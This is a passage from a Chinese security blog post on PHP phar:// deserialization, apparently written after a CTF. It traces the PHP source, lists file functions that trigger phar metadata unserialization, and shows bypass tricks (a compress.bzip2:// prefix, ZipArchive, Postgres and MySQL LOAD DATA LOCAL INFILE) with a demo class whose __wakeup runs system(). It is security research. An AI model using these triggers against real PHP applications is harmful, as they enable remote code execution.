src=\"https://static-up.zsxsoft.com/zb_users/upload/2018/10/20181022191840154020712093196.png\" alt=\"\"\u003e\u003c/p\u003e\r\n\u003cp\u003e仅仅是知道一些受影响的函数，就够了吗？为什么就可以使用了呢？\u003c/p\u003e\r\n\u003ch2 id=\"h2-u5BFBu627Eu53D7u5BB3u8005\"\u003e\u003ca name=\"寻找受害者\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003e寻找受害者\u003c/h2\u003e\u003cp\u003e当然不够。我们需要先找到其原理，然后往下深入挖掘。\u003cbr\u003e先看\u003ccode\u003efile_get_contents\u003c/code\u003e的代码。其调用了\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003estream = php_stream_open_wrapper_ex(filename, \u0026quot;rb\u0026quot; ....);\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e这么个函数。\u003c/p\u003e\r\n\u003cp\u003e再看\u003ccode\u003eunlink\u003c/code\u003e的代码，其调用了\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003ewrapper = php_stream_locate_url_wrapper(filename, NULL, 0);\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e这么个函数。\u003c/p\u003e\r\n\u003cp\u003e从\u003ccode\u003ephp_stream_open_wrapper_ex\u003c/code\u003e的\u003ca href=\"https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010\" \u003e实现\u003c/a\u003e，可以看到，其也调用了\u003ccode\u003ephp_stream_locate_url_wrapper\u003c/code\u003e 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了\u003ccode\u003ephar://\u003c/code\u003e这个wrapper， \u003ca href=\"https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c\" \u003ehttps://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c\u003c/a\u003e\u003cbr\u003e其定义如下：\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003econst php_stream_wrapper_ops phar_stream_wops = {\r\n    phar_wrapper_open_url,\r\n    NULL,                  /* phar_wrapper_close */\r\n    NULL,                  /* phar_wrapper_stat, */\r\n    phar_wrapper_stat,     /* stat_url */\r\n    phar_wrapper_open_dir, /* opendir */\r\n    \u0026quot;phar\u0026quot;,\r\n    phar_wrapper_unlink,   /* unlink */\r\n    phar_wrapper_rename,   /* rename */\r\n    phar_wrapper_mkdir,    /* create directory */\r\n    phar_wrapper_rmdir,    /* remove directory */\r\n    NULL\r\n};\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e接着，让我们翻这几个函数的实现，会发现它们都调用了\u003ccode\u003ephar_parse_url\u003c/code\u003e，这个函数再调用\u003ccode\u003ephar_open_or_create_filename\u003c/code\u003e -\u0026gt; \u003ccode\u003ephar_create_or_parse_filename\u003c/code\u003e -\u0026gt; \u003ccode\u003ephar_open_from_fp\u003c/code\u003e -\u0026gt;  \u003ccode\u003ephar_parse_pharfile\u003c/code\u003e -\u0026gt;  \u003ccode\u003ephar_parse_metadata\u003c/code\u003e -\u0026gt; \u003ccode\u003ephar_var_unserialize\u003c/code\u003e。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。\u003c/p\u003e\r\n\u003cp\u003e只是这些文件函数，就够了吗？\u003cbr\u003e当然不够。这是一个所有的和IO有关的函数，都可能触发的问题。\u003c/p\u003e\r\n\u003cp\u003e前面我已经指出，它们都有一个共同特征，就是调用了\u003ccode\u003ephp_stream_locate_url_wrapper\u003c/code\u003e。但是这个不那么好用，换\u003ccode\u003ephp_stream_open_wrapper\u003c/code\u003e更合适点。让我们搜索一下PHP源代码吧，\u003c/p\u003e\r\n\u003cp\u003e我们很快就能发现，操作文件的\u003ccode\u003etouch\u003c/code\u003e，也是能触发它的。不看文件了，我们假设文件全部都能用。\u003c/p\u003e\r\n\u003cp\u003e我们会惊讶（一点都不）地发现：\u003c/p\u003e\r\n\u003ch3 id=\"h3-exif\"\u003e\u003ca name=\"exif\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003eexif\u003c/h3\u003e\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003eexif_thumbnail\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003eexif_imagetype\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003ch3 id=\"h3-gd\"\u003e\u003ca name=\"gd\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003egd\u003c/h3\u003e\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003eimageloadfont\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003eimagecreatefrom***\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003ch3 id=\"h3-hash\"\u003e\u003ca name=\"hash\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003ehash\u003c/h3\u003e\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003ehash_hmac_file\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003ehash_file\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003ehash_update_file\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003emd5_file\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003esha1_file\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003ch3 id=\"h3-file-url\"\u003e\u003ca name=\"file / url\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003efile / url\u003c/h3\u003e\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003eget_meta_tags\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003eget_headers\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003ch3 id=\"h3-standard\"\u003e\u003ca name=\"standard\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003estandard\u003c/h3\u003e\u003cul\u003e\r\n\u003cli\u003e\u003ccode\u003egetimagesize\u003c/code\u003e\u003c/li\u003e\u003cli\u003e\u003ccode\u003egetimagesizefromstring\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\r\n\u003ch2 id=\"h2-zip\"\u003e\u003ca name=\"zip\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003ezip\u003c/h2\u003e\u003cpre\u003e\u003ccode class=\"language-php\"\u003e$zip = new ZipArchive();\r\n$res = $zip-\u0026gt;open(\u0026#39;c.zip\u0026#39;);\r\n$zip-\u0026gt;extractTo(\u0026#39;phar://test.phar/test\u0026#39;);\u003c/code\u003e\u003c/pre\u003e\r\n\u003ch3 id=\"h3-bzip-gzip\"\u003e\u003ca name=\"Bzip / Gzip\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003eBzip / Gzip\u003c/h3\u003e\u003cp\u003e这，够了吗？non non哒哟！\u003c/p\u003e\r\n\u003cp\u003e如果题目限制了，\u003ccode\u003ephar://\u003c/code\u003e不能出现在头几个字符怎么办？请欣赏你船未见过的船新操作。\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode\u003e$z = \u0026#39;compress.bzip2://phar:///home/sx/test.phar/test.txt\u0026#39;;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://static-up.zsxsoft.com/zb_users/upload/2018/10/201810222048564120307.png\" alt=\"\"\u003e\u003c/p\u003e\r\n\u003cp\u003e当然，它同样适用于\u003ccode\u003ecompress.zlib://\u003c/code\u003e。\u003c/p\u003e\r\n\u003ch3 id=\"h3-postgres\"\u003e\u003ca name=\"Postgres\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003ePostgres\u003c/h3\u003e\u003cp\u003e再来个数据库吧！\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003e\u0026lt;?php\r\n$pdo = new PDO(sprintf(\u0026quot;pgsql:host=%s;dbname=%s;user=%s;password=%s\u0026quot;, \u0026quot;127.0.0.1\u0026quot;, \u0026quot;postgres\u0026quot;, \u0026quot;sx\u0026quot;, \u0026quot;123456\u0026quot;));\r\n@$pdo-\u0026gt;pgsqlCopyFromFile(\u0026#39;aa\u0026#39;, \u0026#39;phar://test.phar/aa\u0026#39;);\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e当然，\u003ccode\u003epgsqlCopyToFile\u003c/code\u003e和\u003ccode\u003epg_trace\u003c/code\u003e同样也是能使用的，只是它们需要开启phar的写功能。\u003c/p\u003e\r\n\u003ch3 id=\"h3-mysql\"\u003e\u003ca name=\"MySQL\" class=\"reference-link\" href=\"#\" \u003e\u003c/a\u003e\u003cspan class=\"header-link octicon octicon-link\"\u003e\u003c/span\u003eMySQL\u003c/h3\u003e\u003cp\u003e还有什么骚操作呢？\u003cbr\u003e……MySQL？\u003cbr\u003e走你！\u003c/p\u003e\r\n\u003cp\u003e我们注意到，\u003ccode\u003eLOAD DATA LOCAL INFILE\u003c/code\u003e也会触发这个\u003ccode\u003ephp_stream_open_wrapper\u003c/code\u003e. 让我们测试一下。\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003e\u0026lt;?php\r\nclass A {\r\n    public $s = \u0026#39;\u0026#39;;\r\n    public function __wakeup () {\r\n        system($this-\u0026gt;s);\r\n    }\r\n}\r\n$m = mysqli_init();\r\nmysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);\r\n$s = mysqli_real_connect($m, \u0026#39;localhost\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;easyweb\u0026#39;, 3306);\r\n$p = mysqli_query($m, \u0026#39;LOAD DATA LOCAL INFILE \\\u0026#39;phar://test.phar/test\\\u0026#39; INTO TABLE a  LINES TERMINATED BY \\\u0026#39;\\r\\n\\\u0026#39;  IGNORE 1 LINES;\u0026#39;);\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e再配置一下mysqld。\u003c/p\u003e\r\n\u003cpre\u003e\u003ccode class=\"language-ini\"\u003e[mysqld]\r\nlocal-infile=1\r\nsecure_file_priv=\u0026quot;\u0026quot;\u003c/code\u003e\u003c/pre\u003e\r\n\u003cp\u003e……然后，走你！\u003c/p\u003e\r\n\u003cp\u003e\u003cimg src=\"https://static-up.zsxsoft.com/zb_users/upload/2018/10/201810222135135740815.png\" alt=\"\"\u003e\u003c/p\u003e\r\n\u003cp\u003e这就是我想要看到的舞台！——长颈鹿\u003cbr\u003e很可惜，这不是默认配置；但是，嗯，很有意思。\u003c/p\u003e\r\n\u003cp\u003e我相信，PHP代码内部还有相当多的\u003ccode\u003ephp_stream_open_wrapper\u003c/code\u003e等待挖掘，这只是关于stream wrapper利用的一小步。\u003c/p\u003e\r\n","PostTime":"1540217661","CommNums":"1","ViewNums":22468,"CommentPostUrl":"https://blog.zsxsoft.com/zb_system/cmd.php?act=cmt\u0026amp;postid=38\u0026amp;key=97c193d540a457d0cdf6fc4a756ffd06","Url":"https://blog.zsxsoft.com/post/38","Intro":"\u003cp\u003e今年的HITCON打完了，沉迷写前端搞Nextjs骚操作的我成功爆0（雾），不想写前端了.jpg。\u003c/p\u003e\r\n","Comments":[{"ID":"395","RootID":"0","ParentID":"0","AuthorID":"0","Name":"tinmin","Content":"师傅好，我想问一下，我用ubuntu18.04 配置了mysql5.7 [mysql]\u003cbr/\u003elocal-infile=1\u003cbr/\u003e[mysqld]\u003cbr/\u003elocal-infile=1\u003cbr/\u003esecure_file_priv=\"\"\u003cbr/\u003e，然后php7.2.19运行了那段代码,显示PHP Warning:  mysqli_query(): LOAD DATA LOCAL INFILE forbidden in /home/tinmin/Desktop/index.php on line 11，网上查的还是没解决\u003clabel id=\"AjaxComment395\"\u003e\u003c/label\u003e","Avatar":"https://cn.gravatar.com/avatar/03becd9a38b03715b8fa709e5cf1ddc1?s=60\u0026amp;d=mm\u0026amp;r=G","HomePage":"http://tinmin.cn","PostTime":"1566902765","Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36","Comments":[]}],"Prev":{"Url":"/post/37","Title":"V8 Snapshot / Nw.js Source Protection 研究笔记","ID":"37"},"Next":{"Url":"/post/39","Title":"Nextjs实现纯CSR","ID":"39"}},"zbp":{"bloghost":"https://blog.zsxsoft.com/","ajaxurl":"https://blog.zsxsoft.com/zb_system/cmd.php?act=ajax\u0026src=","cookiepath":"/","lang":{"error":{"29":"邮箱格式不正确，可能过长或为空","46":"评论内容不能为空或过长","72":"名称不能为空或格式不正确"}}},"sidebar":[{"Name":"User-Agent","Content":"\u003ciframe src=\"https://www.zsxsoft.com/php-useragent/test-my-useragent.php?noua\" width=\"100%\" height=\"400px\" border=\"0\" style=\"border:none; color: #fff\"\u003e\u003c/iframe\u003e","Type":"div","HtmlID":"test-user-agent","FileName":"test-ua","MaxLi":"0"},{"Name":"最新留言","Content":"\u003cli\u003e\u003ca href=\"/post/42#cmt472\"  title=\"EVO @ 2022-07-27 17:56:09\"\u003e这种混淆不再是原先的直接替换节点就能解决的混淆了\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/41#cmt462\"  title=\"zsx @ 2021-11-08 12:16:58\"\u003eout.bean内的内容需要你自己复制到你的账本内，这只是一个临时中转站。\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/41#cmt461\"  title=\"superxu @ 2021-11-07 22:18:49\"\u003e我在导入微信或者支付宝账单时，每次只能导入一个账单（微信）生成out.bean，新导入另一个账单（比如支付宝）的会覆盖掉out.bean，请问如何进行除重操作呢？抱歉没看懂github的readme\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/35#cmt439\"  title=\"zsx @ 2021-03-23 23:17:04\"\u003e这篇文章会更详细一些，但结论相同，没看出什么问题\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/35#cmt438\"  title=\"ano1 @ 2021-03-08 00:19:47\"\u003e不太准确。。下面这篇才是正解http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/41#cmt429\"  title=\"0x3fe @ 2020-07-21 00:31:40\"\u003e这篇不仅让我想起了在上学时坚持的每日记账的习惯(在家就几乎没有收入和支出，也就失去了每日记账的习惯)，还见识到了一款优秀的记账软件，很棒！\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/42#cmt421\"  title=\"ftcx @ 2020-04-11 17:26:39\"\u003e能参考的资料很多呀，比如这篇 PHP解密：EnPHP mzphp2加密 无法还原变量名的混淆加密 https://www.52pojie.cn/thread-883976-1-1.html\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/42#cmt418\"  title=\"zsx @ 2020-03-20 12:42:04\"\u003e这里有一篇文章讲述了讲述了开发PHP混淆需要满足的基本要求和评价指标。不过就我看来，除了名词扯的有点多以外，这篇文章内的实现仍然处于我说的“20分钟就可以解除”的范围。[1]王江涛. 代码自动混淆技术在脚本源程序加密保护中的应用研究[D]. 广州: 华南理工大学, 2014.\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/42#cmt417\"  title=\"xctf @ 2020-03-13 22:42:42\"\u003e师傅，看了3天了，还是没看懂...可以整理一份可运行的混淆解混淆放在github吗，谢谢了\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/post/25#cmt416\"  title=\"luffer @ 2020-03-12 16:18:35\"\u003eWIA.Items items = dialog.ShowSelectItems(device);Item这么改确实不报错了，可是我扫100张啊，还有时候更多，每扫一次就要点一下，这还叫高速扫描仪？算了，我还是用组件来实现吧，这WIA放弃了\u003c/a\u003e\u003c/li\u003e\r\n","Type":"ul","HtmlID":"divComments","FileName":"comments","MaxLi":"10"},{"Name":"网站分类","Content":"\u003cli\u003e\u003ca href=\"/list/cate/1/auth/0/date/0-0/tags/0/page/1/\" \u003e未分类\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/2/auth/0/date/0-0/tags/0/page/1/\" \u003e记录整理\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/3/auth/0/date/0-0/tags/0/page/1/\" \u003e代码分享\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/4/auth/0/date/0-0/tags/0/page/1/\" \u003e杂七杂八\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/5/auth/0/date/0-0/tags/0/page/1/\" \u003e挖坑待跳\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/6/auth/0/date/0-0/tags/0/page/1/\" \u003e代码笔记\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/7/auth/0/date/0-0/tags/0/page/1/\" \u003e日常吐槽\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/8/auth/0/date/0-0/tags/0/page/1/\" \u003e简单思考\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/9/auth/0/date/0-0/tags/0/page/1/\" \u003e代码分析\u003c/a\u003e\u003c/li\u003e\r\n","Type":"ul","HtmlID":"divCatalog","FileName":"catalog","MaxLi":"0"},{"Name":"文章归档","Content":"\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2020-3/tags/0/page/1/\" \u003e2020年3月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2019-11/tags/0/page/1/\" \u003e2019年11月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2019-5/tags/0/page/1/\" \u003e2019年5月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2018-10/tags/0/page/1/\" \u003e2018年10月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2018-5/tags/0/page/1/\" \u003e2018年5月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2018-4/tags/0/page/1/\" \u003e2018年4月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2018-3/tags/0/page/1/\" \u003e2018年3月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2018-1/tags/0/page/1/\" \u003e2018年1月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2017-11/tags/0/page/1/\" \u003e2017年11月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2017-10/tags/0/page/1/\" \u003e2017年10月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2017-9/tags/0/page/1/\" \u003e2017年9月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2017-3/tags/0/page/1/\" \u003e2017年3月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2017-1/tags/0/page/1/\" \u003e2017年1月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-11/tags/0/page/1/\" \u003e2016年11月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-8/tags/0/page/1/\" \u003e2016年8月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-7/tags/0/page/1/\" \u003e2016年7月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-6/tags/0/page/1/\" \u003e2016年6月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-4/tags/0/page/1/\" \u003e2016年4月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-2/tags/0/page/1/\" \u003e2016年2月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2016-1/tags/0/page/1/\" \u003e2016年1月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-10/tags/0/page/1/\" \u003e2015年10月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-8/tags/0/page/1/\" \u003e2015年8月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-7/tags/0/page/1/\" \u003e2015年7月 (1)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-6/tags/0/page/1/\" \u003e2015年6月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-5/tags/0/page/1/\" \u003e2015年5月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-4/tags/0/page/1/\" \u003e2015年4月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-3/tags/0/page/1/\" \u003e2015年3月 (2)\u003c/a\u003e\u003c/li\u003e\r\n\u003cli\u003e\u003ca href=\"/list/cate/0/auth/0/date/2015-2/tags/0/page/1/\" \u003e2015年2月 (5)\u003c/a\u003e\u003c/li\u003e\r\n","Type":"ul","HtmlID":"divArchives","FileName":"archives","MaxLi":"0"}]},"status":200,"dataLoaded":true}},"page":"/Post","query":{"id":"38.html"},"buildId":"QupUZfMzBoEN__cFCmpqR"};__NEXT_LOADED_PAGES__=[];__NEXT_REGISTER_PAGE=function(r,f){__NEXT_LOADED_PAGES__.push([r,f])}</script><script async="" id="__NEXT_PAGE__/Post" src="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/Post.js"></script><script async="" id="__NEXT_PAGE__/_app" src="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/_app.js"></script><script async="" id="__NEXT_PAGE__/_error" src="https://blog.zsxsoft.com/_next/static/QupUZfMzBoEN__cFCmpqR/pages/_error.js"></script><script src="https://blog.zsxsoft.com/_next/static/runtime/webpack-f4542de9ce6104e90191.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/chunks/commons.1749661b9c351bfed1da.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/chunks/styles.8fcb23da458518755372.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/runtime/main-5b31b8367d7796ac13cc.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/scripts/prism-20181026.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/scripts/useragent-0.5.7.js" async=""></script><script src="https://blog.zsxsoft.com/_next/static/social-share-20181026/js/social-share.min.js" async=""></script><script>window.Promise ||document.write('\x3Cscript src="//cdn.jsdelivr.net/npm/es6-promise@4.2.8/dist/es6-promise.min.js">\x3C/script>\x3Cscript>ES6Promise.polyfill()\x3C/script>')</script><script>window.fetch ||document.write('\x3Cscript src="//cdn.jsdelivr.net/npm/whatwg-fetch@2.0.4/fetch.min.js">\x3C/script>')</script><script>''.startsWith ||document.write('\x3Cscript src="//cdn.jsdelivr.net/npm/babel-polyfill@6.26.0/dist/polyfill.min.js">\x3C/script>')</script></body></html>